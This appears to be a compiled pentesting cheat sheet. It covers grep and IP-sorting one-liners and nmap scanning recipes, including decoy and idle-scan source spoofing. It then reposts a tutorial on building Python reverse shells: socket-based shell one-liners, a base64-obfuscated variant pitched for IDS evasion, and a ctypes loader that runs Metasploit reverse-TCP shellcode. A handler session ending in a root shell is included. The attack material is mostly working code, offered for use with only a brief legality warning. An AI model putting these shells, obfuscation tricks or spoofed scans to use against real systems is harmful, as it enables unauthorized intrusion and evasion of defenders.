bash,pentesting one-liners and stuff
Basics
grep case insensitive
grep -i "<this>" <file>
grep recursively
grep -ir "<this>" <directory>
grep with word match only (string starting/ending with non-word constituent character)
grep -wi "<this>" <file>
remove/delete filename from grep output
grep -hi "<this>" <file>


Logical operators
grep for this OR this
grep -i "<this>\|<ORthis>" <file>
grep for this AND this
grep -i "<this>" | grep -i "<ANDthis>" <file>
grep NOT for this
grep -iv "<NOTthis>" <file>
grep for this AND NOT this
grep -i "<this>" | grep -iv "<ANDNOTthis>" <file>


Misc
count the number of lines
grep -ic "<this>" <file>
grep through compressed files
zgrep -i "<this>" <file>


Selective Printing
print the X lines before each matching lines
grep -i "<this>" -B <X> <file>
print the Y lines after each matching lines
grep -i "<this>" -A <Y> <file>
print the X,Y lines before and after each matching lines
grep -i "<this>" -B <X> -A <Y> <file>


# Sort by IP Addresses
sort -n -t. -k1,1 -k2,2 -k3,3 -k4,4

# Sort by IP Addresses and Port like IP:PORT
sed 's#:#.#' | sort -n -t. -k1,1 -k2,2 -k3,3 -k4,4 -k5,5 | sed 's#\(\([0-9]\{1,3\}\.\)\{4\}\)#\1:#;s#\.:#:#'

# IP2HOST: IP -&gt; IP (HOST) using 'bind-host' package built into Ubuntu
for i in $(cat ips.txt); do echo "$i ("`host $i | grep -v NXDOMAIN | cut -d' ' -f5`")"; done | sort -n -t. -k1,1 -k2,2 -k3,3 -k4,4 | sed 's#()##' | tee ip_hosts.txt

# HOST2IP: HOST -&gt; IP (HOST) using 'host' package available in Ubuntu
for i in $(cat hosts.txt); do host `echo "$i" | tr -d [[:blank:]]` | grep -v -e 'alias' -e 'handled' -e 'timed' | sed 's/Host \(.*\) .*/\1 0.0.0.0/' | sed "s/;;.*/$i - - 0.0.0.0/" | awk -F' ' '{printf "%s (%s)\n",$4,$1}'; done | sort -n -t. -k1,1 -k2,2 -k3,3 -k4,4 | tee ip_hosts.txt

#Print IP addresses in a file
egrep -o '[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}'

# Print IP addresses in a file: Perl edition
perl -nle 'print $&amp; if /(\d{1,3}\.){3}\d{1,3}/'
 
# Print IP address in all files in the current directory tree with some pretty color matching
find . -type f -exec egrep -a -H -n --color=auto '[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}' {} \;

Intense Scan
nmap -T4 -A -v -PE -PS22,25,80 -PA21,23,80,3389

Intense Scan Plus UDP
nmap -sS -sU -T4 -A -v -PE -PS22,25,80 -PA21,23,80,3389

Intense Scan, All TCP Ports
nmap -p 1-65535 -T4 -A -v -PE -PS22,25,80 -PA21,23,80,3389

Intense Scan, No Ping
nmap -T4 -A -v -PN

Slow Comprehensive Scan
nmap -sS -sU -T4 -A -v -PE -PP -PS21,22,23,25,80,113,31339 -PA80,113,443,10042 -PO --script all

Ping Scan
nmap -sP -PE -PA21,23,80,3389

Quick Scan
nmap -T4 -F

Quick Scan Plus
nmap -sV -T4 -O -F –version-light

Quick Traceroute
nmap -sP -PE -PS22,25,80 -PA21,23,80,3389 -PU -PO –traceroute

Slow Comprehensive Scan
nmap -sS -sU -T4 -A -v -PE -PP -PS21,22,23,25,80,113,31339 -PA80,113,443,10042 -PO --script all


Top Heavy Servers
Scanning for every in-scope IP Address plus 65,535 port combinations to gather an inventory of live hosts could last longer than your contract engagement. You may need to pick 20 to 30 ports. In a perfect scenario, at least one of these ports will be open on every server that you need to find. Use -p to specify destination ports; a good starting list are the following UDP (U:) and TCP (T:) ports:
-p U:53,111,137,T:21-25,80,135,139,443,445,3389,8080


NMAP IP SPOOF
nmap -e eth0 -S 'fake ip' -PN 'target'

Large Network:
One of my favorite tools to manage a population of network hosts is the excellent tool NMap. It can easily and quickly be used to scan a large subnet for live hosts. I recently scanned a /16 or 65,535 hosts subnet in about 30 minutes with NMap detecting most common running services on the hosts discovered (note that the network was not very populated, so a densely populated network will take longer to scan than a sparsely populated network). This is a very fast and useful tool. I was particularly interested in MAC addresses as I was seeing some unusual ARP traffic and wanted to see what IP address might be assigned to the device.

The command I used to scan the subnet was:

nmap -PR -oN nmap-arpscan.txt 192.168.0.0/16


NMAP ADVANCED

So we're going to start with a subnet, and lets for arguments sake call the subnet 10.10.10.0/24 (one I can remember throughout this series), that'll be our starting point and from here we'll start the datamining. First things first, a lot of tools don't accept CIDR notation (think onesixtyone et al) so we'll need a list of IPs. NMaps list scan comes in handy here:

nmap -sL -n 10.10.10.0/24 | grep "Nmap scan" | cut -f 5 -d " " > ~/<target_org>/targets/IPs.txt

To break that down we're using the nmap list command to produce a list of targets without actually scanning them, and then manipulating the output with grep and cut to provide only a list of IPs.

In the file structure we should save it as IPs.txt in a targets folder, something a long the lines of:

~/<target_org>/targets/IPs.txt

I'm back, the other nut from this ballsy pair (that'll be the last time I make those jokes I promise). So where were we? (We were here if you missed the previous post) We had a network range, 10.10.10.0/24 and we'd split the range down into a list of IP addresses for the awkward tools that don't like CIDR notation, that and we've dumped the file into the beginnings of our data file structure. Recap over and on we go.

So what's next? We have a number of set and forget operations that need to run, the kind of data that takes a long time to collect but we need to get anyway, you all know what I'm talking about, the good old full 65535 ports tcp/udp/version/OS scan.

First things first let's set up some variables, it'll make life easier in the long run and sets a good precident for when we come to script these things up. First lets set the range, nice and simple in bash, at the prompt type:

root@bt:~# range=10.10.10.0/24

Next we need to set our own IP address so that we can get rid of it, if you're cabled into a subnet the last thing you want to do is panic about a BT5 box on their network when it turns out to be your own. Once again nice and simple at the prompt type:

root@bt:~# myip=`ifconfig eth1 | grep "inet addr:" | cut -d : -f 2 | cut -d " " -f 1`

We can now use both of these going forward. Does anyone here like screen? I like screen, it's a good way of compartmentalising your work and more importantly if you're working on a remote box you can keep your sessions active without using nohup, big bonus.

First lets bang out the pingsweeps, if we're local it's good to have an idea of what's actually responding. There's no point in scanning devices we know from the arp cache don't exist, of course if this is remote then skip ahead. The ARP sweep in NMap allows us to do this quite easily:

nmap -sP -PA -vv -n -oA pingsweeps/pingsweep.arp $range --exclude $myip > /dev/null 2>&1 && cat pingsweep.arp.gnmap | grep Up | cut -f 2 -d " " > targets/targets.txt

For completeness (don't we all love piles of data) lets cover all the ping sweeps, they don't take long.

nmap -sP --send-ip -PE -vv -n -oA pingsweep.icmpecho -i targets.txt > /dev/null 2>&1
nmap -sP --send-ip -PP -vv -n -oA pingsweep.icmptstamp -i targets.txt > /dev/null 2>&1
nmap -sP --send-ip -PM -vv -n -oA pingsweep.icmpmask -i targets.txt > /dev/null 2>&1

Right now onto the actual scans. Although they take forever and we don't get tangeable, workable results from them straight away (watch this space for that) they need to be done.  Your scan preferences may differ but I find these acceptable for most engagements.

screen -S "full-tcp" -d -m nmap -sSVC -p- -n -vv -oA port_scans/portscan.tcp.full -i targets.txt --max-retries 1

screen -S "full-udp" -d -m nmap -sU --max-scan-delay 0 --max-retries 1 -n -vv -oA port_scans/portscan.udp.services -i targets.txt

The joy of screen is that these truly are set and forget and at any time you can type screen -r <scan_name> to check their progress (if you feel so inclined) it beats the usual ps -ef | grep nmap that we're all used to or heaven forbid tailing the nohup.out file.

Sidenote: So the big issue with NMap is that if it gets stuck on a host a ctrl-c usually means losing all the results you've gained so far. Seeing as we have a targets file we can write a wrapper that scans each ip address individually, that way if NMap hangs on a host you can ctrl-c and just carry on with the next host. It'll look something like this:

while read line; do `nmap -sSVC -p- -n -vv -oA $line.tcp.full $line --max-retries 1`; done < targets.txt

Of course you then have to bring all of the results back together again, there are a few scripts out there that achieve this, if I can dig one out I'll link it.

Back to the main event. While these scans are completing we need something to be getting along with, how many hosts are running web servers? how many snmp? mail servers? etc etc. A quick scan alongside the full ones allows us to start getting this data and passing it onto other software quick sharp. Of course you could always use the --top-ports=<1-4000ish> flag, but I prefer to write my own list, this does the job for me: 

screen -S "hot-targets" -d -m nmap -sSV -p80,443,25,3389,23,22,21,53,135,139,445,389,3306,1352,1433,1434,1157,U:53,U:161 n -vv -oA port_scans/hot-targets.tcp.services -i targets.txt

The greppable output from here can then be thrown directly into tools like nikto, onesixtyone, skipfish etc.

Last bit I want to cover off is non-standard web ports. There are a few ways we can cover them off, firstly we can wait for the full scan to complete and grep for www or http, that would be the most sensible thing to do, and should probably be done no matter what. In the mean time we can search for some:

screen -S "webhosts" -d -m nmap -sSV -p 80,443,81,82,8080,8081,8443,8118,3128,280,591,593 -n -vv -oA port_scans/webhosts.tcp.services -i targets.txt

By no means a conclusive list (please add more in the comments/twitter and I'll update) but it's a good starting point.

That'll probably do for now, before you're all NMaped out, next time we'll go through what we can do with this data now we have it.



After a brief chat with @stevelord on twitter I came to agree that I'd been lazy and left out RTT optimisation for the scanning, it was on my to-do list but I thought I'd wait and do a clean up post at some point, well that point is now, to get an idea of the RTTs for the network you're on you're going to need to do some pinging, and seeing as we have nping why not sure it, what I came up with was this bad boy:


INITRTT=`nping --icmp $(head -5 targets) | grep "Avg rtt" | cut -f 13 -d " " | sort | uniq | awk 'sub("..$", "")' | awk 'NR == 1 { sum=0 }{ sum+=$1;} END {printf "%f\n", sum/NR}' | cut -f 1 -d "."` && MAXRTT=$[INITRTT*4]


This pings the top five hosts in the targets file, averages their RTTs and then multiplies it by 4. This creates the variables INITRTT and MAXRTT and these can then be used in the nmap scans with the flags:


initial-rtt-timeout $[INITRTT]ms & max-rtt-timeout $[MAXRTT]ms


WARNING! These penetration testing (security testing) examples may be considered as Unauthorized Access or Illegal Behavior. Use examples on your own RISK and/or to secure your own network host / IPS /IDS.


# nmap -n -Ddecoy-ip1,decoy-ip2,your-own-ip,decoy-ip3,decoy-ip4 remote-host-ip

# nmap -n -D192.168.1.5,10.5.1.2,172.1.2.4,3.4.2.1 192.168.1.5

Following example, uses an an idle scan technique. It uses port 1234 on 1.1.1.1 IP as as a zombie to scan host – 192.1.2.3:

# nmap -P0 -sI 1.1.1.1:1234 192.1.2.3

This technique only hides your source address but remote IPS / IDS always record and logs scan. Please refer to nmap man page for more information:


for ip in `nmap -n   -sP RANGE.* -oX - | xpath -q -e '//host/status[@state="up"]/../address/@addr' | sed -e 's/^[^"]*"//;s/".*$//'`; do export REV=`dig  +short -x $ip | tail -n 1 `; export PORTS=`nmap -oX - $ip |xpath -q -e '//port/state[@state="open"]/../@portid' | sed -e 's/^[^"]*"//;s/".*$//' | xargs  echo | sed -e 's/ /;/g'`; export RREV=`dig +short $REV | tail -n 1 `; echo "$ip;$RREV;$REV;$PORTS"; done | tee resultat

nmap -d -p445 --script=smb-enum-users 192.168.0.183|perl -le 'while() {if(/^|.*?(w+)$/) { $h{$1}++;}} foreach $key (keys %h) { print "$key";}'




PYTHON ATTACK
 

 Reference:
https://pauldotcom.com/2011/10/python-one-line-shell-code.html

You have remote command execution on a linux web server. Your normal tricks for getting a shell don't work but you know that the system has a fully functional python interpreter. In order to make your attack work you need to put the entire attack into a single command line passed to a python interpreter with the -c option. Here are a few python based one liners that can be executed with the -c option and tips for creating additional shells. Each of these examples shovel a shell to localhost. Start up a netcat listener to receive the shell ($nc -l -p 9000) before launching these sample attacks.
First we start out with a simple python reverse tcp connect shell like this one.


#!/usr/bin/python

import socket

import subprocess 

s=socket.socket() 

s.connect(("127.0.0.1",9000)) 

while 1:

  p = subprocess.Popen(s.recv(1024),  shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

  s.send(p.stdout.read() + p.stderr.read())



Then we try to collapse it down to one line by separating the existing lines with semicolons. That is simple enough, but there is a problem. Python relies on spacing to indicate the start and end of a code block. The while loop doesn't want to collapse to a single line. But we can get it down to two lines.


>>> import socket;import subprocess ;s=socket.socket() ;s.connect(("127.0.0.1",9000)) 

>>> while 1:  p = subprocess.Popen(s.recv(1024),  shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);  s.send(p.stdout.read() + p.stderr.read())



If you keep the spacing straight and put those two lines into an interactive python session it works properly. As soon as you try to collapse the two lines with a semicolon you get a syntax error. The good news is you can get around that with the "exec" method. Python's exec method is similar to "eval()" in javascript and we can use it to interpret a script with "\n" (new lines) in it to separate the lines. Using this technique we get the following one line python shell.

python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('127.0.0.1',9000))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"


Setup a netcat listner on your localhost listening on port 9000 and this works very nicely. If we are going to use exec(), we might as well add a little IDS evasion to the mix and obscure our code. So lets drop into interactive python and encode our payload.

markbaggett$ python

Python 2.5.1 (r251:54863, May  5 2011, 18:37:34) 

[GCC 4.0.1 (Apple Inc. build 5465)] on darwin

Type "help", "copyright", "credits" or "license" for more information.

>>> shellcode="import socket, subprocess;s = socket.socket();s.connect(('127.0.0.1',9000))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())"

>>> shellcode.encode("base64")

'aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcztzID0gc29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgo\nJzEyNy4wLjAuMScsOTAwMCkpCndoaWxlIDE6ICBwcm9jID0gc3VicHJvY2Vzcy5Qb3BlbihzLnJl\nY3YoMTAyNCksIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJw\ncm9jZXNzLlBJUEUsIHN0ZGluPXN1YnByb2Nlc3MuUElQRSk7cy5zZW5kKHByb2Muc3Rkb3V0LnJl\nYWQoKStwcm9jLnN0ZGVyci5yZWFkKCkp\n'


Next we take the base64 encoded version of our payload and exec() that with the decode() method to turn it back into our script source before execution. Our one liner becomes this:

python -c "exec('aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcztzID0gc29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgo\nJzEyNy4wLjAuMScsOTAwMCkpCndoaWxlIDE6ICBwcm9jID0gc3VicHJvY2Vzcy5Qb3BlbihzLnJl\nY3YoMTAyNCksIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJw\ncm9jZXNzLlBJUEUsIHN0ZGluPXN1YnByb2Nlc3MuUElQRSk7cy5zZW5kKHByb2Muc3Rkb3V0LnJl\nYWQoKStwcm9jLnN0ZGVyci5yZWFkKCkp\n'.decode('base64'))"


Now lets apply this technique to a python shells that executes a payload from the Metasploit framework such as the one I discussed on the SANS Penetration Testing Blog. With this technique I create a python script that executes a payload from the metasploit framework. In this example I'll use the osx reverse tcp shell. After grabbing the stage1 bytes from "$./msfpayload osx/x86/shell_reverse_tcp LHOST=127.0.0.1 C" ( see SANS blog ) I built the following python script.

from ctypes import *

reverse_shell = "\x68\x7f\x00\x00\x01\x68\xff\x02\x11\x5c\x89\xe7\x31\xc0\x50\x6a\x01\x6a\x02\x6a\x10\xb0\x61\xcd\x80\x57\x50\x50\x6a\x62\x58\xcd\x80\x50\x6a\x5a\x58\xcd\x80\xff\x4f\xe8\x79\xf6\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x54\x53\x50\xb0\x3b\xcd\x80"

memorywithshell = create_string_buffer(reverse_shell, len(reverse_shell))

shellcode = cast(memorywithshell, CFUNCTYPE(c_void_p))

shellcode()


Spaces and carriage returns aren't a problem for this very simple script so with a few semicolons we get the following one liner. We don't need to use the "exec()" function since we don't need to interpret multiple lines.

root# python -c "from ctypes import *;reverse_shell = \"\x68\x7f\x00\x00\x01\x68\xff\x02\x11\x5c\x89\xe7\x31\xc0\x50\x6a\x01\x6a\x02\x6a\x10\xb0\x61\xcd\x80\x57\x50\x50\x6a\x62\x58\xcd\x80\x50\x6a\x5a\x58\xcd\x80\xff\x4f\xe8\x79\xf6\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x54\x53\x50\xb0\x3b\xcd\x80\";memorywithshell = create_string_buffer(reverse_shell, len(reverse_shell));shellcode = cast(memorywithshell, CFUNCTYPE(c_void_p));shellcode()"

Before pressing enter on the shell above you will need to setup the framework multi/handler to receive the incoming shell.. This time the shell is connecting back to the default port of 4444 so we set it up as follows:

msf > use multi/handler

msf  exploit(handler) > set payload osx/x86/shell_reverse_tcp

payload => osx/x86/shell_reverse_tcp

msf  exploit(handler) > set LHOST 127.0.0.1

LHOST => 127.0.0.1

msf  exploit(handler) > exploit



[*] Started reverse handler on 127.0.0.1:4444
[*] Starting the payload handler...
[*] Command shell session 1 opened (127.0.0.1:4444 -> 127.0.0.1:54471) at 2011-10-20 09:19:03 -0400


id
uid=0(root) gid=0(wheel) groups=0(wheel),1(daemon),2(kmem),8(procview),29(certusers),3(sys),9(procmod),4(tty),5(operator),80(admin),20(staff),101(com.apple.sharepoint.group.1)


